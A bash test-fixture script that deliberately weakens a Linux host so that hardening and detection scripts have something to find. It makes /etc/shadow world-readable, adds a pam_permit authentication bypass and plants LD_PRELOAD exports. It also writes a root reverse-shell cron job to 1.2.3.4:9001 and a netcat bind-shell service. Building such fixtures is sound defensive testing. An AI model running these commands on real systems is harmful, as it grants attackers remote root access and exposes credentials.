#!/bin/bash
# inject_vulnerabilities.sh
# Purpose: Create artifacts and misconfigurations to test hardening scripts.
# WARNING: THIS SCRIPT INTENTIONALLY WEAKENS THE SYSTEM.

echo "[*] Starting Vulnerability Injection..."

# 1. check-go-binaries.sh: Create dummy Go binary
echo "[+] Creating fake Go binary..."
dd if=/dev/zero of=/tmp/fake_go_binary bs=1M count=2 >/dev/null 2>&1
echo "go1.something" >> /tmp/fake_go_binary
chmod +x /tmp/fake_go_binary
echo "    Created /tmp/fake_go_binary"

# 2. environment-variables-scanner.sh: suspicious env vars
echo "[+] Injecting suspicious environment variables..."
cat > /etc/profile.d/bad_env.sh << 'EOF'
export LD_PRELOAD=/tmp/malicious.so
export LD_LIBRARY_PATH=/tmp/libs
EOF
chmod +x /etc/profile.d/bad_env.sh
echo "    Created /etc/profile.d/bad_env.sh"

# 3. find_media.sh: dummy media files
echo "[+] Creating dummy media files..."
# Create a dummy user home if needed, or use /home/ubuntu if exists, else /home
TARGET_HOME=$(getent passwd 1000 | cut -d: -f6 || echo "/home/testuser")
if [ ! -d "$TARGET_HOME" ]; then
    mkdir -p /home/testuser
    TARGET_HOME="/home/testuser"
fi
touch "$TARGET_HOME/suspicious_movie.mp4"
touch "$TARGET_HOME/hacker_image.jpg"
touch "$TARGET_HOME/data.mp3"
echo "    Created media files in $TARGET_HOME"

# 4. fix-file-permissions.sh: weak permissions
echo "[+] Weakening file permissions..."
chmod 644 /etc/shadow
echo "    Set /etc/shadow to 644 (World Readable!)"

# 5. pam_audit.sh: dangerous PAM config
echo "[+] Injecting dangerous PAM config..."
# Backup first
if [ ! -f /etc/pam.d/common-auth.bak ]; then
    cp /etc/pam.d/common-auth /etc/pam.d/common-auth.bak 2>/dev/null || true
fi
# Add pam_permit.so sufficient
if [ -f /etc/pam.d/common-auth ]; then
    echo "auth sufficient pam_permit.so" >> /etc/pam.d/common-auth
    echo "    Added pam_permit.so to common-auth"
else
    echo "    /etc/pam.d/common-auth not found, skipping"
fi

# 6. search-pii.sh: fake PII
echo "[+] Creating fake PII..."
cat > "$TARGET_HOME/pii_data.txt" << EOF
Name: John Doe
SSN: 123-45-6789
CC: 4111-1111-1111-1111
EOF
echo "    Created $TARGET_HOME/pii_data.txt"

# 7. secure-php.sh: insecure PHP config
echo "[+] Creating insecure php.ini..."
mkdir -p /etc/php/7.4/cli/ 2>/dev/null || true
touch /etc/php/php.ini
echo "allow_url_include = On" >> /etc/php/php.ini
echo "expose_php = On" >> /etc/php/php.ini
echo "display_errors = On" >> /etc/php/php.ini
echo "    Created /etc/php/php.ini with insecure settings"

# 8. systemd-hunting.sh: malicious service
echo "[+] Creating malicious systemd service..."
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/nc -l -p 1337 -e /bin/bash
User=root

[Install]
WantedBy=multi-user.target
EOF
# Don't enable it to avoid actually opening ports, just file presence
echo "    Created /etc/systemd/system/backdoor.service"

# 9. user-profiles-compiler.sh: malicious alias
echo "[+] Injecting malicious alias..."
echo "alias sudo='sudo -s # malicious'" >> "$TARGET_HOME/.bashrc"
echo "    Added alias to $TARGET_HOME/.bashrc"

# 10. archive_cronjobs.sh: suspicious cron
echo "[+] Creating suspicious cron job..."
echo "* * * * * root /bin/bash -i >& /dev/tcp/1.2.3.4/9001 0>&1" > /etc/cron.d/backdoor
echo "    Created /etc/cron.d/backdoor"

# 11. archive_ssh_keys.sh: user key
echo "[+] Adding dummy SSH key..."
mkdir -p "$TARGET_HOME/.ssh"
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... dummy-key" >> "$TARGET_HOME/.ssh/authorized_keys"
chmod 600 "$TARGET_HOME/.ssh/authorized_keys"
chown -R "$(stat -c '%U' "$TARGET_HOME")" "$TARGET_HOME/.ssh"
echo "    Added key to $TARGET_HOME/.ssh/authorized_keys"

echo "[*] Vulnerability Injection Complete. System is now COMPROMISED."
